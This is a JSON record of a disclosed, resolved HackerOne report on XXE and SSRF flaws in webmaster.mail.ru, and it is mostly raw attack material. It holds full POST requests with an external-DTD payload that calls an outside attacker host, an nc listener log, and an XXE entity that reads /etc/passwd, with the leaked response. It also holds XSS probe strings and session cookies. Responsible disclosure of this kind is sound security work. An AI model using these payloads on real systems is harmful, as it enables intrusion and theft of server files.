{
  "id": 12583,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjU4Mw==",
  "url": "https://hackerone.com/reports/12583",
  "title": "XXE and SSRF on webmaster.mail.ru",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2014-05-20T01:13:14.623Z",
  "submitted_at": "2014-05-20T01:13:14.623Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "4lemon",
    "url": "/4lemon",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/194/aa0eb7d0d4c0ee7d20ae9b2550953b4eeda26ef9_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 65,
    "url": "https://hackerone.com/mailru",
    "handle": "mailru",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Mail.ru",
      "twitter_handle": "",
      "website": "https://vk.company/",
      "about": "Building the Internet since 1998"
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2014-12-10T19:09:45.137Z",
  "bug_reporter_agreed_on_going_public_at": "2014-11-21T10:02:23.332Z",
  "team_member_agreed_on_going_public_at": "2014-12-10T19:09:44.577Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "SSRF request:\r\nPOST /domain/metadata HTTP/1.1\r\nHost: webmaster.mail.ru\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:29.0) Gecko/20100101 Firefox/29.0\r\nAccept: application/json, text/javascript, */*; q=0.01\r\nAccept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nX-Requested-With: XMLHttpRequest\r\nReferer: http://webmaster.mail.ru/domain/\r\nContent-Length: 909\r\nCookie: p=fwoAANHmmQAA; mrcu=3BE3537A7E507ED9608843B61205; VID=0DDvyr1ZZvnD:; i=AQBZfnpTAQBdAAUCAQA=; b=UT8AADCX/QcAPgAAgh828AAA; s=fver=13; mc1=1400536667; Mpop=1400536671:7e796b525c546e5419050219081d000c1c0600054966535c465d020101000716037572164e505844545f54435444505e4d105d57515e1c4a4c:whitehataudit@mail.ru:; t=obLD1AAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAQAAACAAAEBvAcA; wmus=c9cac4666004e6dadcf235cff3a6a3669a418896\r\nConnection: keep-alive\r\nPragma: no-cache\r\nCache-Control: no-cache\r\n\r\nsitemap_urls=&fullname=fulltitle'%22%3E%3Ca%3EasdF%3C%2FA%3E&sitelinks-title=title'%22%3E%3Ca%3EasdF%3C%2FA%3E&sitelinks-url=%2Fasdfasdf&meta-adress-country=country'%22%3E%3Ca%3EasdF%3C%2FA%3E&meta-adress-region=region'%22%3E%3Ca%3EasdF%3C%2FA%3E&meta-adress-city=city'%22%3E%3Ca%3EasdF%3C%2FA%3E&meta-adress-adress=addr'%22%3E%3Ca%3EasdF%3C%2FA%3E&meta-adress-code-c=&meta-adress-code-r=&meta-adress-phone=&sitelinks_xml=<!DOCTYPE aaa SYSTEM  \"http://95.211.198.76:6666/xxe.xml\"> <site><name><![CDATA[fulltitle'\"><a>asdF</A>]]></name><sitelinks><sitelink title=\"title\" url=\"http://simple-semiconductors.com/asdfasdf\" /></sitelinks><addresses><address><addressLocality>city%26foo%3b</addressLocality><addressCountry>country </addressCountry><addressRegion>region</addressRegion><streetAddress>addr</streetAddress></address></addresses></site>&id=481265&site_url=simple-semiconductors.com&sitemap_url_errors=-1\r\n\r\npayload:\r\n<!DOCTYPE aaa SYSTEM  \"http://95.211.198.76:6666/xxe.xml\"> \r\n\r\non server side:\r\nnc -vvv -l 6666\r\nConnection from 217.69.133.45 port 6666 [tcp/ircu-2] accepted\r\nGET /xxe.xml HTTP/1.0\r\nHost: 95.211.198.76:6666\r\nAccept-Encoding: gzip\r\n\r\nping webmaster.mail.ru\r\nPING webmaster.mail.ru (217.69.133.45) 56(84) bytes of data.\r\n\r\nЗапрос идёт с сервера webmaster.mail.ru. Соответственно, в контексте этого сервера возможны вектора SSRF. Всё это хорошо описано в https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit\r\n\r\nXXE request:\r\nPOST /domain/metadata HTTP/1.1\r\nHost: webmaster.mail.ru\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:29.0) Gecko/20100101 Firefox/29.0\r\nAccept: application/json, text/javascript, */*; q=0.01\r\nAccept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nX-Requested-With: XMLHttpRequest\r\nReferer: http://webmaster.mail.ru/domain/\r\nContent-Length: 929\r\nCookie: p=fwoAANHmmQAA; mrcu=3BE3537A7E507ED9608843B61205; VID=0DDvyr1ZZvnD:; i=AQBZfnpTAQBdAAUCAQA=; b=UT8AADCX/QcAPgAAgh828AAA; s=fver=13; mc1=1400536667; Mpop=1400536671:7e796b525c546e5419050219081d000c1c0600054966535c465d020101000716037572164e505844545f54435444505e4d105d57515e1c4a4c:whitehataudit@mail.ru:; t=obLD1AAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAQAAACAAAEBvAcA; wmus=c9cac4666004e6dadcf235cff3a6a3669a418896\r\nConnection: keep-alive\r\nPragma: no-cache\r\nCache-Control: no-cache\r\n\r\nsitemap_urls=&fullname=fulltitle'%22%3E%3Ca%3EasdF%3C%2FA%3E&sitelinks-title=title'%22%3E%3Ca%3EasdF%3C%2FA%3E&sitelinks-url=%2Fasdfasdf&meta-adress-country=country'%22%3E%3Ca%3EasdF%3C%2FA%3E&meta-adress-region=region'%22%3E%3Ca%3EasdF%3C%2FA%3E&meta-adress-city=city'%22%3E%3Ca%3EasdF%3C%2FA%3E&meta-adress-adress=addr'%22%3E%3Ca%3EasdF%3C%2FA%3E&meta-adress-code-c=&meta-adress-code-r=&meta-adress-phone=&sitelinks_xml=<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY foo SYSTEM \"file:///etc/passwd\" >]> <site><name><![CDATA[fulltitle'\"><a>asdF</A>]]></name><sitelinks><sitelink title=\"title\" url=\"http://simple-semiconductors.com/asdfasdf\" /></sitelinks><addresses><address><addressLocality>city%26foo%3b</addressLocality><addressCountry>country </addressCountry><addressRegion>region</addressRegion><streetAddress>addr</streetAddress></address></addresses></site>&id=481265&site_url=simple-semiconductors.com&sitemap_url_errors=-1\r\n\r\npayload:\r\n<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY foo SYSTEM \"file:///etc/passwd\" >]> <site><name><![CDATA[fulltitle'\"><a>asdF</A>]]></name><sitelinks><sitelink title=\"title\" url=\"http://simple-semiconductors.com/asdfasdf\" /></sitelinks><addresses><address><addressLocality>%26foo%3b</addressLocality><addressCountry>country </addressCountry><addressRegion>region</addressRegion><streetAddress>addr</streetAddress></address></addresses></site>\r\n\r\nresponse:\r\nHTTP/1.1 200 OK\r\nServer: nginx\r\nDate: Tue, 20 May 2014 01:00:28 GMT\r\nContent-Type: application/json; charset=utf-8\r\nContent-Length: 129\r\nConnection: keep-alive\r\nKeep-Alive: timeout=20\r\nSet-Cookie: wmus=c9cac4666004e6dadcf235cff3a6a3669a418896; path=/; expires=Sat, 19-Jul-2014 01:00:28 GMT; HttpOnly\r\n\r\n{\"xml_error\":true,\"error\":\"Element 'addressLocality': [facet 'pattern'] The value 'root:x:0:0:root:/root:/bin/bash\",\"line\":1}\r\n\r\nТут по-хорошему надо поиграться с XSD, чтобы вывод был полный, но шлю сразу. Если будут добавления - пришлю ещё.\r\n",
  "weakness": {
    "id": 58,
    "name": "Command Injection - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2014-12-21T10:02:24.024Z",
  "allow_singular_disclosure_after": -288667569.78740525,
  "singular_disclosure_allowed": true,
  "vote_count": 4,
  "voters": [
    "sa1tama0",
    "smodnix",
    "shivammusic",
    "spetr0x"
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
